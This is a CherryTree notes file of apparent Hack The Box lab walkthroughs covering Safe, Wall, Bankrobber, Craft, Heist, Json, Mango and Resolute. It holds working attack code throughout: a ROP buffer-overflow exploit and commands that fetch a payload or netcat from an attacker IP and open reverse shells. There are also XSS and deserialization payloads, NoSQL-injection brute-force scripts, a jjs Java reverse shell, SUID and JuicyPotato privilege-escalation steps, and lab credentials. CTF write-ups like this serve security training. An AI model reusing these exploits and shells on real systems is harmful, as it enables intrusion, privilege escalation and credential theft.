@@ -1,0 +1,1332 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Safe" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570664515.38" ts_lastsave="1571320108.78" unique_id="1">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571319082.89" ts_lastsave="1571319084.3" unique_id="3">
+			<rich_text>port 1337 is running a binary.
+Binrary can be downloaded for analysis
+
+**Always check the source of the page. Always!!!
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571319136.36" ts_lastsave="1571320017.98" unique_id="7">
+			<rich_text>-- When we download binary we see it is x86_64 i.e 64-bit binary. 
+-- We know that 64 bit binaries use the gadgets(registers) to push arguments on the stack.
+-- Use gdb to get the buffer size so that we can find out the buffer overflow position.
+-- We use ROPGadget to find our gadget to find out gadget in which %rdi is getting poopped so that we can put our arguments on the stack. 
+-- We need to find an address in the binary which is writable. As the system binary is already loaded we can use it to get the shell by passing the arguments /bin/sh. 
+-- We use pwndbg&gt; vmmap to find out a region which has --rw (read/write) access. The address is from 0x404000 to 0x405000. We use telescope function to find out the address which is not referenced in the variable. We select any of these addresses.
+-- Since we control the gets we can get it's address and redirect to our gadget address and then pass it to the writeable section of binary so that ouir argument is passed.
+-- Next we get the system address and redirect the pointer to the system binary without knowing the address.
+-- Next we pass the payload and the pass the string to system - /bin/sh
+
+from pwn import *
+context.binary = &quot;/root/Desktop/HTB/boxes/Safe/exploit-dev/myapp&quot;
+elf = context.binary
+payload = &quot;A&quot; *120
+
+#0x000000000040120b : pop rdi ; ret
+
+payload += p64(0x000000000040120b)
+payload += p64(0x404080)
+payload += p64(elf.plt[&quot;gets&quot;])
+payload += p64(0x000000000040120b)
+payload += p64(0x404080)
+payload += p64(elf.plt[&quot;system&quot;])
+
+s=remote(&quot;10.10.10.147&quot;,1337)
+s.sendline(payload)
+s.sendline(&quot;/bin/sh&quot;)
+s.interactive()
+
+-- After getting the shell we can add our authorized keys to .ssh using ssh-keygen
+-- SSH to the “user” user. </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571320108.78" ts_lastsave="1571320110.2" unique_id="8">
+			<rich_text>-- After getting SSH we get some images and .kdbx file, which is a keepass 2.x db backup.
+-- We see that it can be cracked so we convert it to hash using keepass2john.py &lt;kdbx-file&gt; , but with no luck. 
+-- After research we find that we can pass the key file with master password to lock the db. 
+-- There is a switch in /usr/sbin/keepass2john to give key files. (-k)
+-- So we use all the images files as the keys and try to generate the hash. We pass the 6 hashes in the hashcat and wait for it to crack.
+-- Hashcat cracks the hash 0547 and then we can pass the IMG file in keepass2 tool to find out the root password. 
+-- Then we can use the su root to get to root.</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Wall" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570618813.39" ts_lastsave="1571689939.71" unique_id="1">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663489.13" ts_lastsave="1570663489.93" unique_id="6">
+			<rich_text>-- changing the GET verb of /monitoring to POST we get a directory /centreon with a login page and a known authenticated RCE.
+
+-- Fix the exploit or do it manually </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Creds" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570618818.94" ts_lastsave="1570663312.75" unique_id="2">
+			<rich_text>centreon UI :admin:password1
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663312.75" ts_lastsave="1570664677.25" unique_id="4">
+			<rich_text>Bypassing the WAF was tough.
+-- wget${IFS}http://10.10.14.26:8090/python-rev-shell.py|python${IFS}python-rev-shell.py
+-- write a reverse shell in python and pass it using above command
+-- execute the code to get a reverse shell:-
+
+POST /centreon/include/configuration/configGenerate/xml/generateFiles.php HTTP/1.1
+Host: 10.10.10.157
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: </rich_text>
+			<rich_text link="webs http://10.10.10.157/centreon/main.get.php?p=60902&amp;poller=">http://10.10.10.157/centreon/main.get.php?p=60902&amp;poller=</rich_text>
+			<rich_text>
+Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+Content-Length: 33
+Cookie: PHPSESSID=o8o509tarstdkkumm6ni7ih098
+Connection: close
+X-Requested-With: XMLHttpRequest
+
+poller=1&amp;debug=true&amp;generate=true
+-- after getting reverse shell do basic enum</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570663321.65" ts_lastsave="1570663325.97" unique_id="5">
+			<rich_text>-- After finding screen-4.0.5 version vulnerable to  priv esc and has suid set we:-
+-- create libhax.so &amp; rootshell
+-- cd /etc
+-- umask 000 # because
+-- screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
+-- screen -ls # screen itself is setuid, so... 
+-- /tmp/rootshell</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Bankrobber" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571689939.71" ts_lastsave="1574539510.94" unique_id="9">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571689946.82" ts_lastsave="1571690190.35" unique_id="10">
+			<rich_text>/user - create an account as regular user
+/admin - use xss stealing to steal admin cookie.
+
+Login to admin to get /search.php and /backdoorchecker.php access
+/search.php term variable is vulnerable to sql injection</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Creds" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571690197.5" ts_lastsave="1571697697.89" unique_id="11">
+				<rich_text>WEB:Admin:Hopelessromantic
+DB:root:Welkom1!
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574539162.12" ts_lastsave="1574539163.46" unique_id="18">
+			<rich_text>-- Use cookiestealer script to get reverse shell on the box as user cortin. We wrote a custom exploit for the same:-
+
+var http = new XMLHttpRequest();
+var url = 'backdoorchecker.php';
+//var params = 'cmd=dir | powershell Invoke-WebRequest </rich_text>
+			<rich_text link="webs http://10.10.14.4/nc64.exe">http://10.10.14.4/nc64.exe</rich_text>
+			<rich_text> -Outfile C:\\Windows\\Temp\\nc64.exe';
+var params = 'cmd=dir| powershell C:\\Windows\\Temp\\nc64.exe 10.10.14.4 9001 -e cmd.exe'
+http.open('POST', url, true);
+
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.send(params);
+
+
+//var a = http.status;
+var b = &quot;hello&quot;;
+
+var http = new XMLHttpRequest();
+var url = &quot;</rich_text>
+			<rich_text link="webs http://10.10.14.26/test.php&quot;+b+&quot;done&quot;;">http://10.10.14.26/test.php&quot;+b+&quot;done&quot;;</rich_text>
+			<rich_text>
+var params = 'cmd1=dir';
+http.open('POST', url, true);
+
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+http.send(params);
+
+-- Upgrade the shell to meterpreter and run netstat -alnp to find out about the port 910 and the application running on top of it.
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574539510.94" ts_lastsave="1574539864.91" unique_id="19">
+			<rich_text>-- After learning about the port - issue the command - portfwd add -l 910 -p 910 -r 127.0.0.1
+-- Then connect to the port using telnet 127.0.0.1 910
+-- We see the banking application is running. We need to compromise it to get root.
+-- We wrote a custom expect script to get the exploit working.
+
+-- Script--
+#!/usr/bin/expect
+
+set f [open &quot;0-list.txt&quot;]
+set pins [split [read $f] &quot;\n&quot;]
+close $f
+
+spawn nc 127.0.0.1 910
+foreach pin $pins {
+expect &quot;login:&quot; {
+	send &quot;$pin\r&quot;
+}
+sleep 3
+expect “access granted!” {
+    send &quot;'A'*30C:/Temp/nc64.exe 10.10.14.10 9001 -e cmd.exe
+    }
+expect &quot;....&quot; {
+	
+	sleep 5
+	spawn nc 127.0.0.1 910
+	sleep 5
+}
+}
+interact
+
+-- We will fiind that the pin is 0021 and use the pin to transfer the money.
+-- There is a vulnerbaility in the bankv2.exe in which we can overflow the buffer by passing 30 characters. 
+-- We exploit it using the script.
+-- Post exploitation netcat shell is returned as nt\system</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Craft" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574368544.95" ts_lastsave="1574538152.39" unique_id="12">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574371466.44" ts_lastsave="1574537674.24" unique_id="14">
+			<rich_text>-- Use the password found in the database to log into gilfoyle gogs account.
+-- Learn about craft-infra directory and download the zip to analyze.
+-- We find .ssh keys of gilfoyle to login. But they are encrypted openssh keys
+-- We find password resuse vulnerability and get the User on the box.
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574368555.69" ts_lastsave="1574537676.78" unique_id="13">
+			<rich_text>-- Subdomains: - api.craft.htb &amp;&amp; gogs.craft.htb
+-- Creds: - dinesh:4aUh0A8PbVJxgd
+-- reverse shell returned from eval injection, but we are inside a docker container.
+-- Learn about settings.py and dbtest.py is writeable. So we change the code a little bit and run it:- 
+   #!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+
+# test connection to mysql database
+
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                             user=settings.MYSQL_DATABASE_USER,
+                             password=settings.MYSQL_DATABASE_PASSWORD,
+                             db=settings.MYSQL_DATABASE_DB,
+                             cursorclass=pymysql.cursors.DictCursor)
+
+try: 
+    with connection.cursor() as cursor:
+        sql = &quot;select * from user&quot;
+        cursor.execute(sql)
+        result = cursor.fetchall()
+        print(result)
+
+finally:
+    connection.close()
+
+-- dbtest.py -- gives a result as tables 
+     1)craft 
+     2)user -
+         [{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password':       
+          'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574371647.2" ts_lastsave="1574537510.95" unique_id="15">
+			<rich_text>-- There is a ssh mount for the root.
+-- If we check out the secrets.sh we can see that we can generate otp for root user and use it for ssh.
+-- </rich_text>
+			<rich_text family="monospace">vault ssh -role otp_key_role -mode otp -strict-host-key-checking=no root@1</rich_text>
+			<rich_text>27.0.0.1
+-- We will see the OTP for the session and as soon as we plug it. We are done.</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Heist" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574538152.39" ts_lastsave="1574879648.68" unique_id="17">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Insteresting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574542316.79" ts_lastsave="1574718237.08" unique_id="20">
+			<rich_text>-- Port 80 :- config file in attachments -- password cracked - $1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
+-- Port 135/445 - SMB -- hazard:stealth1agent (Only Read access to IPC4)
+-- Port 5985 - ?
+-- Port 49669 - ?
+
+
+CISCO IFM Password cracked - 
+--username:password
+    -- rout3r:$uperP@ssword
+    -- admin:Q4)sJu\Y8qz*A3?d
+ LOOKUP SIDs:-
+ 500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)   </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574720856.79" ts_lastsave="1574720858.53" unique_id="21">
+			<rich_text>-- Put all the found usernames from LookupSID and the three password we have in a file - 
+-- Run the metasploit module for the auxiliary/scanner/winrm/winrm_login with the userpass file.
+-- We see that the account name SUPPORTDESK\Chase with password (Q4.....) is logged in successfully.
+-- Use the existing winrm ruby script to interact as a shell:-
+        require 'winrm'
+        
+        conn = WinRM::Connection.new(
+        endpoint: '</rich_text>
+			<rich_text link="webs http://10.10.10.149:5985/wsman',">http://10.10.10.149:5985/wsman',</rich_text>
+			<rich_text>
+        user: 'Chase',
+        password: 'Q4)sJu\Y8qz*A3?d',
+        domain: 'SUPPORTDESK'	
+        )
+
+        command=&quot;&quot;
+
+        conn.shell(:powershell) do |shell|
+        until command == &quot;exit\n&quot; do
+        print &quot;PS &gt; &quot;
+        command = gets        
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end    
+    puts &quot;Exiting with code #{output.exitcode}&quot;
+end
+
+-- Once we get code execution we can easily drop a netcat executable and get a reverse shell
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574879648.68" ts_lastsave="1574879649.84" unique_id="22">
+			<rich_text>-- Post getting the user shell, we run the powershell and get all the processes using get-process.
+-- We see the process firefox running and try to use the firefox_decrypt of passwords approach, but it didn't work out as we did not have logins.json file available.
+-- So after research we find out that we can upload memory dump script in the box and can get the process dump to identify if any cleartext passwords are present in memory.
+-- So we upload Out-MiniDump.ps1 to the server and run the command 
+
+    $curl &lt;kali&gt;/Out-Mini.ps1 
+    $import-module Out-Mini.ps1
+    $get-process -name “firefox” | Out-Mini.ps1 -DumpFilePath &lt;path_to_dump&gt;
+    
+-- transfer the dump file using nc/pscp/meterpreter and run strings on it. Run command
+    
+    $cat &lt;&gt;.dmp | grep username
+
+-- We get creds 
+    -http://localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
+
+--We use the creds with psexec.py and nt authority\system
+       </rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Postman" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574537692.15" ts_lastsave="1574941162.44" unique_id="16">
+		<rich_text></rich_text>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Json" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574941162.44" ts_lastsave="1576013526.66" unique_id="23">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1574941169.68" ts_lastsave="1574941265.26" unique_id="24">
+			<rich_text>-- ports :- 
+
+21 - FileZilla FTP server
+
+80 - code 403 for cred :- admin&amp;admin
+
+445
+
+49512
+49513
+49514
+49515
+49516
+49517
+49518
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1575575097.88" ts_lastsave="1575626953.89" unique_id="25">
+			<rich_text>- After logging in the admin portal and deciphering the JS we find out that there is one GET request made to
+    /api/account with a bearer header which takes base64 args and send it to the server. 
+- When we send a random base64 value we are greeted with the error - 
+         &lt;Error&gt;&lt;Message&gt;An error has occurred.&lt;/Message&gt;&lt;ExceptionMessage&gt;Cannot deserialize Json.Net Object&lt;/ExceptionMessage&gt;&lt;ExceptionType&gt;System.Exception&lt;/ExceptionType&gt;&lt;StackTrace /&gt;&lt;/Error&gt;
+
+- From the error we realize that there is a Json deserilization attack possible (Friday the 13th attack) but for .NET framework.
+- So we compile the Windows VM and get the tool ysoserial.net.
+- We run the ping test first and then run the following command to get the reverse shell.
+        ### To download the nc64.exe        
+        #&gt;ysoserial.exe -f Json.Net -g WindowsIdentity -o base64 -c “certutil.exe -urlcache -split -f ”http://&lt;Kali Ip&gt;/nc64.exe&quot; C:/windows/temp/nc64.exe
+        ###
+        #&gt;ysoserial.exe -f Json.Net -g WindowsIdentity -o base64 -c “C:/windows/temp/nc64.exe Kali IP port -e cmd.exe&quot;
+- Then we automate the exploit to get a reverse shell as userpool. We use the following exploit :-
+
+import requests
+from requests import Session
+import base64 
+url = &quot;</rich_text>
+			<rich_text link="webs http://10.10.10.158/api/account&quot;">http://10.10.10.158/api/account&quot;</rich_text>
+			<rich_text>
+login = &quot;</rich_text>
+			<rich_text link="webs http://10.10.10.158/api/token&quot;">http://10.10.10.158/api/token&quot;</rich_text>
+			<rich_text>
+def exploit(payload):
+	#b64payload =base64.b64encode(payload) 
+	with Session() as s:
+		login_data = {&quot;UserName&quot;:&quot;admin&quot;,&quot;Password&quot;:&quot;admin&quot;}
+		resp = s.post(login,login_data)
+		cookie=resp.headers['Set-Cookie'].split(';')
+		print (cookie[0])
+		setheaders= {&quot;Cookie&quot;: cookie[0],&quot;Bearer&quot;: payload}
+		res = s.get(url,headers=setheaders)
+		print (res.text)
+
+def create_payload():
+	payload = open('trigger.txt','r').read().strip()
+	return payload
+		
+print (create_payload())
+payload=create_payload()
+exploit(payload)
+
+- Once we run the exploit we will get the reverse and the user.txt         </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1575627330.63" ts_lastsave="1575645755.26" unique_id="26">
+			<rich_text>- After getting inside the box we run whoami /priv and we see we have SeImpersonateToken privilege which tell us that we can run JuicyPotato. [ PLease refer to the writeups for more ways of privesc]
+- So we get the release of the JuicyPotato from the github and use the ysoserial.exe to tranfer the binary to the location C:/windows/temp.
+- Now we have to run the command to get reverse shell as nt authority/ system , but it has been haredened for us as the default CLSID for JuicyPotato which checks for BITS is blocked. 
+- So we run a systeminfo and get the OS - &gt; Windows server 2012 R2 and find the CLSID on github for the DCOM server - winuasrv  ( windows update service) .
+-  Now we issue the following command to get the reverse shell as admin:
+         juicypotato.exe -t * -p “C:/windows/temp/nc64.exe &lt;Kali IP&gt; port -e cmd.exe” -l port -c ‘&lt;working CLSID for Windows 2012 R2’
+         
+- And we have pwned the box.
+             </rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Mango" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576013526.66" ts_lastsave="1576073089.13" unique_id="27">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576013535.52" ts_lastsave="1576013536.33" unique_id="28">
+			<rich_text>-- Ports
+
+22 - ssh
+80 - If we check the port directly we get a 403 error. However if we add the domain - staging-order.mango.htb - to our /etc/hosts file we see that we are redirected to the login page.
+
+443 - It is a rabbit hole ( Other than providing the hint that username and password is stored in MongoDB, it doesn't provide any details)</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576013844.29" ts_lastsave="1576073031.68" unique_id="29">
+			<rich_text>- Once we get the request in repeater we can use the MongoDB vuln to query the datbase by using NOSQL Injection.
+         • we change the request from </rich_text>
+			<rich_text weight="heavy">username=admin&amp;password=password&amp;login=login</rich_text>
+			<rich_text> to 
+            </rich_text>
+			<rich_text weight="heavy">username[$regex]=admin&amp;password[$ne]=password&amp;login=login</rich_text>
+			<rich_text> 
+- This way we can enumerate users by quickly writing a python script:
+```
+</rich_text>
+			<rich_text weight="heavy">import requests
+import urllib3
+import string
+import urllib
+from requests import Session
+urllib3.disable_warnings()
+
+username=&quot;&quot;   ### (change to username when fuzzing passwords)
+password=&quot;asd&quot;
+u=&quot;</rich_text>
+			<rich_text link="webs http://staging-order.mango.htb&quot;" weight="heavy">http://staging-order.mango.htb&quot;</rich_text>
+			<rich_text weight="heavy">
+headers={'Content-Type': 'application/x-www-form-urlencoded'}
+
+while True:
+
+        for i in string.ascii_letters + string.digits + &quot;!@#%^()@_{}&lt;&gt;()[]$&quot;:
+                payload=&quot;username[$regex]=%s&amp;password[$ne]=%s&amp;login=login&quot; % (username  + i , password )
+                #print (payload)
+                r = requests.post(u, data = payload, headers=headers, verify = False , proxies={'http':'127.0.0.1:8000'},allow_redirects=False)
+                print (i,  r.status_code)
+                if r.status_code == 302:
+                        print(&quot;Found one more char : %s&quot; % (username + i))
+                        username += i
+</rich_text>
+			<rich_text>```
+- We get two usernames - admin and mango
+- Now we try to find the passwords using the same script
+</rich_text>
+			<rich_text weight="heavy">import requests
+import urllib3
+import string
+import urllib
+from requests import Session
+urllib3.disable_warnings()
+
+username=&quot;admin/mango&quot;
+password=&quot;^&quot;
+u=&quot;</rich_text>
+			<rich_text link="webs http://staging-order.mango.htb&quot;" weight="heavy">http://staging-order.mango.htb&quot;</rich_text>
+			<rich_text weight="heavy">
+headers={'Content-Type': 'application/x-www-form-urlencoded'}
+
+while True:
+
+        for i in string.ascii_letters + string.digits + &quot;!@#%^()@_{}&lt;&gt;()[]$&quot;:
+                payload=&quot;username[$eq]=%s&amp;password[$regex]=%s&amp;login=login&quot; % (username , password + i )
+                #print (payload)
+                r = requests.post(u, data = payload, headers=headers, verify = False , proxies={'http':'127.0.0.1:8000'},allow_redirects=False)
+                print (i,  r.status_code)
+                if r.status_code == 302:
+                        print(&quot;Found one more char : %s&quot; % (password + i))
+                        password += i
+</rich_text>
+			<rich_text>                        
+- We run crunch to generate wordlist with alphabets , digits and special chars. We pipe it into the BURP to find out how many of the chars are present in the passwords:-
+
+        admin:-
+            a-z --- c,t
+            A-Z --- B,K,S
+            0-9 --- 0,2,3,9
+            sp.chars --- !,#,$,^,&gt;
+       mango:-
+             a-z --- f,h,m
+             A-Z --- H,K,R,U,X
+             0-9 --- 3,5,8
+             sp.chars --- $,],^,{,~
+
+Final Passwords:- 
+
+</rich_text>
+			<rich_text weight="heavy">admin: ^t9KcS3&gt;!0B#2$ -- removing regex operators -- {t9KcS3&gt;!0B#2}
+
+mango: ^h3mXK8RhU~f{]f5H$ -- removing regex operators -- {h3mXK8RhU~f{]f5H}
+
+- We will use the passwords to SSH into box as first mango user and then su to admin using the password obtained.
+- We can read the user.txt</rich_text>
+			<rich_text>
+             
+
+                     
+ </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576014779.68" ts_lastsave="1576061575.3" unique_id="30">
+			<rich_text>- In order to read the root flag only we can run this command :
+
+</rich_text>
+			<rich_text family="monospace">echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);var FileReader = Java.type(&quot;java.io.FileReader&quot;);var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));while ((line = br.readLine()) != null) { print(line); }' | </rich_text>
+			<rich_text>/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+
+- In order to get a reverse shell as root :
+
+</rich_text>
+			<rich_text family="monospace">echo 'var host=Java.type(&quot;java.lang.System&quot;).getenv(&quot;RHOST&quot;);var port=Java.type(&quot;java.lang.System&quot;).getenv(&quot;RPORT&quot;);varProcessBuilder=Java.type(&quot;java.lang.ProcessBuilder&quot;);var p=new ProcessBuilder(&quot;/bin/bash&quot;, &quot;-i&quot;).redirectErrorStream(true).start();var Socket = Java.type(&quot;java.net.Socket&quot;);var s=new Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()&gt;0)so.write(pi.read()); while(pe.available()&gt;0)so.write(pe.read()); while(si.available()&gt;0)po.write(si.read()); so.flush();po.flush(); Java.type(&quot;java.lang.Thread&quot;).sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' |</rich_text>
+			<rich_text> /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+
+Hash - 8a8ef79a7a2fbb01ea81688424e9ab15</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Resolute" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576073089.13" ts_lastsave="1576233247.29" unique_id="31">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576073096.92" ts_lastsave="1576145181.57" unique_id="32">
+			<rich_text>Ports :
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49671/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49677/tcp open  unknown          syn-ack ttl 127
+49688/tcp open  unknown          syn-ack ttl 127
+49711/tcp open  unknown          syn-ack ttl 127
+49773/tcp open  unknown          syn-ack ttl 127
+49950/tcp open  unknown          syn-ack ttl 127
+50032/tcp open  unknown          syn-ack ttl 127
+
+1) Winrm 47001 - ?
+2) ADWS 9389 - ?
+3) Ldap 389 - DNS - Resolute.megabank.local
+4)     1&gt; SMB 139,445 - Authentication required
+        2 &gt;    MSRPC - connect using rpcclient - Dom users - user:[Administrator] rid:[0x1f4]
+          user:[Guest] rid:[0x1f5]  
+          user:[krbtgt] rid:[0x1f6]
+          user:[DefaultAccount] rid:[0x1f7]
+          user:[ryan] rid:[0x451]
+          user:[marko] rid:[0x457]
+          user:[sunita] rid:[0x19c9]
+          user:[abigail] rid:[0x19ca]
+          user:[marcus] rid:[0x19cb]
+          user:[sally] rid:[0x19cc]
+          user:[fred] rid:[0x19cd]
+          user:[angela] rid:[0x19ce]
+            user:[felicia] rid:[0x19cf]
+            user:[gustavo] rid:[0x19d0]
+            user:[ulf] rid:[0x19d1]
+            user:[stevie] rid:[0x19d2]
+            user:[claire] rid:[0x19d3]
+            user:[paulo] rid:[0x19d4]
+            user:[steve] rid:[0x19d5]
+            user:[annette] rid:[0x19d6]
+            user:[annika] rid:[0x19d7]
+            user:[per] rid:[0x19d8]
+            user:[claude] rid:[0x19d9]
+            user:[melanie] rid:[0x2775]
+            user:[zach] rid:[0x2776]
+            user:[simon] rid:[0x2777]
+            user:[naoki] rid:[0x2778]
+            
+            Domain:         MEGABANK
+            Server:
+            Comment:
+            Total Users:    79
+            Total Groups:   0
+            Total Aliases:  0
+            Sequence No:    1
+            Force Logoff:   -1
+            Domain Server State:    0x1
+            Server Role:    ROLE_DOMAIN_PDC
+            Unknown 3:      0x1
+
+          
+  
+5) Kerberos 88 - Need a user  - [The server is domain controller]
+6) </rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Creds" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576145181.57" ts_lastsave="1576175190.72" unique_id="33">
+				<rich_text>In domain Megabank.local
+
+- Username - marko 
+- Fullnam- Marko Novak 
+- rid 0x457 
+- Password Welcome123!
+
+
+Goto directory C:/PStranscripts and read the file to find out the password :- ryan/Serv3r4Admin4cc123!</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576150473.18" ts_lastsave="1576153188.22" unique_id="34">
+			<rich_text>- We run queryuser with all the users and check for the Kickoff time Last password set time.
+- We notice melanie has her kickoff time as 1969 which means that there is a big chance that she has the password set to “Welcome123!”
+- We try it and get the smb access. Also when we try it with wsman we get the winrm  ruby shell and then we drop the netcat to get the reverse shell/
+- Then we can read the user.txt</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1576153347.81" ts_lastsave="1576232314.52" unique_id="35">
+			<rich_text>
+
+- First we will use the creds for Ryan with winrm ruby to drop a netcat and get a reverse shell .
+- Once we are ryan we run whoami /all ( could use the WinPEAS.bat ) as well and find out :- 
+
+Group Name                                 Type             SID                                            Attributes                                                     
